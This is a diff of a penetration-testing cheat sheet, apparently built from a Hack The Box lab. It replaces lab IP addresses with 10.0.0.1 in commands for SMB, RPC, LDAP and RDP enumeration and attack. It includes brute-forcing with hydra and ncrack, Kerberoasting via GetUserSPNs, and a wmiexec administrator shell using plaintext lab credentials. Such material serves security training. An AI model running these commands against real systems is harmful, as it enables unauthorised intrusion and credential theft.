@@ -27,8 +27,8 @@ dirb http://10.0.0.1/abc/ /usr/share/wordlists/dirb/big.txt
 ```
 #### Gobuster
 ```
-gobuster -u http://10.11.1.10/ -w /usr/share/wordlists/dirb/common.txt -e -t 20
-gobuster dir -u http://10.11.1.10/ -w /usr/share/wordlists/dirb/big.txt -t 30 -e -k -x .html,.php,.asp,.aspx,.htm,.xml,.json,.jsp,.pl
+gobuster -u http://10.0.0.1/ -w /usr/share/wordlists/dirb/common.txt -e -t 20
+gobuster dir -u http://10.0.0.1/ -w /usr/share/wordlists/dirb/big.txt -t 30 -e -k -x .html,.php,.asp,.aspx,.htm,.xml,.json,.jsp,.pl
 ```
 
 
@@ -65,8 +65,8 @@ wpscan --url http://10.0.0.1/ --passwords /usr/share/wordlists/rockyou.txt --use
 ## Port 110
 ## Port 111
 ```
-rpcinfo -p 10.11.1.111
-rpcclient -U "" 10.11.1.111
+rpcinfo -p 10.0.0.1
+rpcclient -U "" 10.0.0.1
     srvinfo
     enumdomusers
     getdompwinfo
@@ -96,7 +96,7 @@ nmap -v -p 139,445 --script=smb* 10.0.0.1
 #### Connection attempt
 ```
 smbclient -L \\10.0.0.1
-smbclient -L 10.11.1.31 -U anonymous
+smbclient -L 10.0.0.1 -U anonymous
 smbclient -L 10.0.0.1 --options='client min protocol=NT1'
 ```
 
@@ -108,13 +108,13 @@ smbmap -H 10.0.0.1
 smbmap -H 10.0.0.1 -R
 
 // Recursive enumeration on a specific folder
-smbmap -H 10.129.168.32 -R 'Replication\active.htb'
+smbmap -H 10.0.0.1 -R 'Replication\active.htb'
 
 // Authenticated enumeration
-smbmap -H 10.129.168.32 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -R
+smbmap -H 10.0.0.1 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -R
 
 // Download a file
-smbmap -H 10.129.168.32 --download '.\Users\SVC_TGS\Desktop\user.txt'
+smbmap -H 10.10.0.1 --download '.\Users\SVC_TGS\Desktop\user.txt'
 
 // If error ‘[!] Authentication error on 10.0.0.1’ try with a fake user -u ‘123’
 smbmap -H 10.0.0.1 -R -u ‘123’
@@ -146,19 +146,19 @@ hydra -L username.txt -P password.txt 10.0.0.1 smb -V
 ## Port 143
 ## Port 389
 ```
-ldapsearch -x -h 10.129.168.32 -p 389 -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
+ldapsearch -x -h 10.0.0.1 -p 389 -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
 
 ./GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.129.168.32
 
 
-ldapsearch -x -h 10.129.168.32 -p 389 -D 'SVC_TGS' -w'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
+ldapsearch -x -h 10.0.0.1 -p 389 -D 'SVC_TGS' -w'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
 
 
-./GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.129.168.32
+./GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.0.0.1
 
-./GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.129.168.32 -request
+./GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.0.0.1 -request
 
-./wmiexec.py active.htb/administrator:Ticketmaster1968@10.129.168.32
+./wmiexec.py active.htb/administrator:Ticketmaster1968@10.0.0.1
 ```
 
 
@@ -185,9 +185,9 @@ nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 338
 #### Bruteforce 
 ```
 hydra -L user.txt -P pass.txt 10.0.0.1 rdp
-ncrack -vv --user administrator -P passwords.txt rdp://192.168.1.10,CL=1
+ncrack -vv --user administrator -P passwords.txt rdp://10.0.0.1,CL=1
 ```
 #### Remote Desktop
-rdesktop 192.168.1.10
+rdesktop 10.0.0.1
 rdesktop -u <username> <IP>
 rdesktop -d <domain> -u <username> -p <password> <IP>
